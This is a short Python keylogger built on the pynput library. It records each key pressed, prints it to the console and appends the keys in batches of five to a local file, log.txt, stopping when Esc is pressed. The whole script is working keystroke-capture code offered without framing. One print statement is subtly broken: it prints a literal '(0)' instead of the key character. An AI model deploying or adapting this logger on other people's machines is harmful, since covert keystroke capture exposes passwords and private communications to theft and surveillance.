import pynput

from pynput import keyboard

count = 0
keys = []



def on_press(key): 
    global keys, count
    keys.append(key)
    count += 1
    try:
        print("(0) pressed".format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))

def on_release(key): 
    print("{0} released".format(key))
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
    on_press = on_press, on_release = on_release) as listener:
    listener.join()


